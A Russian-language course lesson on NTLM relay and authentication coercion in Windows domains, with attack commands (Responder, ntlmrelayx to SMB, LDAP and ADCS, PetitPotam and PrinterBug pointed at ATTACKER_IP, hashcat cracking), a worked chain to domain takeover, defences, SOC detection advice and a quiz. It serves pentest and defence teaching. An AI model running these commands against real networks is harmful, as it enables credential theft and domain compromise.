---
id: network-ntlm-relay
title: "NTLM relay и коэрсия: перехват и релей аутентификации"
category: network
parent: network-mitm-wireless
difficulty: hard
order: 4
tags: [network, ntlm, relay, coercion, smb, responder, mitm]
prerequisites: [network-mitm, network-arp-deep]
useful_for:
  - "CTF Network/AD (релей и коэрсия)"
  - "Пентест: движение в Windows-сети"
  - "Работа (SOC): детект NTLM-аномалий"
estimated_minutes: 60
summary: "Как перехватить и переслать NTLM-аутентификацию, зачем нужна коэрсия и как защититься (signing, EPA, SMB over QUIC)."
---

NTLM — legacy-протокол аутентификации Windows. Его главная слабость: аутентификация не привязана к соединению. Перехватив NTLM-обмен, атакующий может **переслать** (relay) его на другой сервис и войти под жертвой — без знания пароля. Коэрсия — принудительная инициировать аутентификацию к нам. Это один из ключевых векторов в Windows-сетях.

## NTLM в двух словах

- **Type 1:** negotiate.
- **Type 2:** challenge (случайные 8 байт).
- **Type 3:** response — NTLM-хэш, вычисленный от challenge.

Проблема: response не привязан к серверу, которому он адресован. Значит, если перехватить Type 3, его можно **переслать** на другой сервис, который выдаст тот же challenge — или на сервис, где challenge нам известен (например, SMB-сервер, с которым мы сами инициировали обмен).

## Почему relay вообще работает

Ключевое — **отсутствие привязки** NTLM-ответа к сессии и сервису. В отличие от Kerberos (где есть SPN и привязка к сервису), NTLMv1/v2 вычисляет ответ от challenge сервера и хэша пароля. Если атакующий контролирует **какой** challenge увидит жертва, он может заранее «проговорить» этот challenge с целевым сервисом (negotiate/Type 2) и, получив Type 3 от жертвы, переслать его как свой. Сервис проверит ответ против **своего** challenge — и он совпадёт, потому что challenge мы взяли у него же.

Из этого следуют условия успеха: (1) NTLM используется, (2) нет signing/EPA, (3) есть способ заставить жертву аутентифицироваться (коэрсия или пассивный перехват). Именно поэтому релей — не «магия», а следствие отсутствия привязки: защита signing/EPA закрывает вектор целиком, а не ослабляет его.

## Классические цели релея

- **SMB → SMB:** доступ к шарам/файлам.
- **HTTP → SMB (WebDAV):** через коэрсию с последующим релеем.
- **LDAP/LDAPS:** изменение каталога, RBCD, добавление компьютера.
- **MSSQL:** выполнение запросов и, через `xp_cmdshell`, команд.
- **SMB → ADCS (ESC8):** запрос сертификата от имени жертвы → полный захват.

Релей не работает там, где включены **SMB signing** или **EPA (Extended Protection for Authentication)** — их и проверяют в первую очередь.

## Коэрсия (принуждение к аутентификации)

Сервисы Windows можно заставить аутентифицироваться к нам:

- **PetitPotam** (MS-EFSRPC), **PrinterBug** (MS-RPRN), **DFSCoerce** (MS-DFSNM), **ShadowCoerce**.
- Работают по SMB/RPC и заставляют жертву инициировать NTLM к указанному UNC-пути.

Без коэрсии релей ждёт, пока кто-то сам к нам аутентифицируется (например, при загрузке по LLMNR). Коэрсия делает атаку **детерминированной**: мы выбираем цель и момент.

## Инструменты и команды

Responder — перехват и анализ:

```bash
sudo responder -I eth0 -wv
# слушает LLMNR/NBT-NS/mDNS и собирает NTLMv2-хэши
```

Релей (ntlmrelayx из Impacket):

```bash
# релей на другой хост, дамп SAM по успеху
impacket-ntlmrelayx -tf targets.txt -smb2support
# релей на LDAP для RBCD
impacket-ntlmrelayx -t ldaps://dc.corp.local --delegate-access
# релей на ADCS (ESC8)
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp --adcs
```

Коэрсия:

```bash
# PetitPotam
python3 PetitPotam.py ATTACKER_IP DC_IP
# PrinterBug
python3 printerbug.py corp.local/user:pass@DC ATTACKER_IP
```

Проверка подписи SMB:

```bash
nmap -p445 --script smb2-security-mode <host>
# или crackmapexec smb <host>
```

## Разобранный пример: коэрсия DC → релей на ADCS

Сценарий: домен с ADCS (Certificate Services) и отключённым EPA на веб-интерфейсе.

1. Проверяем: `ntlmrelayx -t http://ca/certsrv/... --adcs` — цель принимает релей.
2. Запускаем relay и **одновременно** коэрсию: `PetitPotam.py ATTACKER DC` — DC аутентифицируется к нам.
3. relay пересылает аутентификацию DC на ADCS и получает **сертификат машины DC**.
4. С сертификатом (через Rubeus/PKINIT) получаем TGT DC → DCSync → домен захвачен.
5. Вывод: связка коэрсия+релей+ADCS — прямой путь к DA. Защита: SMB signing, EPA, отключение NTLM, LDAP signing/channel binding.

## Защита

- **SMB signing** обязательно (в т.ч. для серверов и клиентов).
- **LDAP signing и channel binding** (EPA) на DC.
- **Отключить NTLM**, где возможно (Kerberos-only).
- **Отключить/защитить ADCS** веб-интерфейс (EPA, HTTPS, отключение ESC8-эндпоинтов).
- **Мониторинг:** детект коэрсии (EFSRPC/RPRN/DFSNM от нештатных источников), аномальных NTLM-релеев.
- **Отключить LLMNR/NBT-NS/mDNS**, где не нужны — меньше возможностей для Responder.

## Детект на стороне SOC

Что искать в логах и трафике:

- **Коэрсия**: вызовы EFSRPC/RPRN/DFSNM от хостов, которые ими не пользуются; аномальные исходящие SMB к необычным хостам.
- **Релей**: NTLM-аутентификация с одного IP к множеству сервисов подряд; несоответствие «пользователь ↔ источник».
- **Аномалии LLMNR/NBT-NS**: ответы от хостов, которые не должны отвечать.
- **События**: 4624/4625 с типом 3 (сетевой логон), 4768/4776 (NTLM).

Правильные контрмеры важнее детекта: signing и EPA делают релей неработоспособным в принципе.

## Инструменты и флаги

| Инструмент | Назначение |
|---|---|
| Responder | перехват LLMNR/NBT-NS/mDNS, сбор хэшей |
| ntlmrelayx | релей на SMB/LDAP/ADCS/MSSQL |
| PetitPotam / PrinterBug / DFSCoerce | коэрсия |
| nmap `smb2-security-mode` | проверка подписи SMB |
| crackmapexec/netexec | проверка доступа |
| Rubeus / PKINITtools | работа с полученным сертификатом |

## Частые ошибки

- **Пытаться релеить на SMB с включённой подписью.** Не сработает — нужен другой протокол/цель.
- **Забывать про EPA.** LDAPS/HTTPS с channel binding блокируют релей.
- **Путать перехват хэша и релей.** NTLMv2-хэш нельзя «использовать напрямую» без релея или взлома.
- **Игнорировать коэрсию.** Без неё релей ждёт чужой аутентификации.
- **Релеить на себя.** Нужны разные «приёмник» и «источник» аутентификации.

## Что делать дальше / решение

- **Нужен доступ** → проверить signing/EPA → выбрать цель → коэрсия + релей.
- **Нужен DA** → релей на ADCS (ESC8) → сертификат → PKINIT → DCSync.
- **Нужна защита** → signing, EPA, отключение NTLM/LLMNR.
- **Нужен детект** → мониторинг коэрсии и аномальных NTLM-релеев.

## NTLMv1 vs NTLMv2 и что можно с хэшем

- **NTLMv1**: ответ детерминирован (DES от challenge); перехваченный хэш можно взломать или использовать в релее почти всегда.
- **NTLMv2**: ответ включает случайный client challenge и HMAC-MD5; перехваченный хэш **нельзя** использовать напрямую — только релей или офлайн-взлом (медленнее).
- **NetNTLMv2** (то, что ловит Responder) — именно ответ; для входа нужен релей или крак.
- **NTLM-хэш (NT hash)** — из дампа SAM/LSASS; используется в pass-the-hash, но это уже другой вектор.

Ключевой вывод: перехваченный NetNTLMv2 **не** «пароль»; либо релей в реальном времени, либо взлом (hashcat -m 5600).

## Быстрая шпаргалка

```bash
sudo responder -I eth0 -wv                         # перехват
impacket-ntlmrelayx -tf targets.txt -smb2support   # релей SMB
impacket-ntlmrelayx -t ldaps://dc --delegate-access # RBCD
impacket-ntlmrelayx -t http://ca/certsrv/certfnsh.asp --adcs  # ESC8
python3 PetitPotam.py ATTACKER DC                  # коэрсия
nmap -p445 --script smb2-security-mode <host>      # signing?
hashcat -m 5600 hash.txt wordlist                  # взлом NetNTLMv2
```

## Квиз

```quiz
- question: "Почему возможен NTLM relay?"
  options:
    - "NTLM-response не привязан к серверу, которому адресован"
    - "NTLM использует открытый пароль"
    - "NTLM не шифрует трафик"
    - "NTLM работает на L2"
  answer: 0
  explanation: "Response можно переслать другому сервису, выдающему тот же challenge."
- question: "Что блокирует релей на SMB?"
  options:
    - "SMB signing"
    - "NAT"
    - "STP"
    - "IPv6"
  answer: 0
  explanation: "Подпись SMB привязывает сообщения к сессии, ломая релей."
- question: "Что такое коэрсия?"
  options:
    - "Принуждение жертвы инициировать NTLM-аутентификацию к нам"
    - "Шифрование NTLM"
    - "Отключение Kerberos"
    - "Подмена MAC"
  answer: 0
  explanation: "PetitPotam/PrinterBug заставляют сервис аутентифицироваться к нашему хосту."
- question: "Какой инструмент перехватывает LLMNR/NBT-NS и собирает NTLMv2-хэши?"
  options:
    - "Responder"
    - "chisel"
    - "macof"
    - "dnsmasq"
  answer: 0
  explanation: "Responder отвечает на LLMNR/NBT-NS/mDNS и собирает NTLM-обмен."
- question: "Почему ADCS — популярная цель релея?"
  options:
    - "Можно получить сертификат от имени жертвы и повысить привилегии (ESC8)"
    - "Он не требует аутентификации"
    - "Он использует NTLM по умолчанию"
    - "Он хранит пароли в открытом виде"
  answer: 0
  explanation: "Релей на веб-эндпоинт ADCS выдаёт сертификат жертвы, открывая путь к DA."
```

## Где пригодится

- **CTF:** AD/Network-задачи на релей и коэрсию.
- **Пентест:** движение в Windows-сети, повышение до DA.
- **Bug bounty:** редко напрямую (внутренние сети).
- **Работа (SOC):** детект коэрсии и NTLM-аномалий, внедрение signing/EPA.
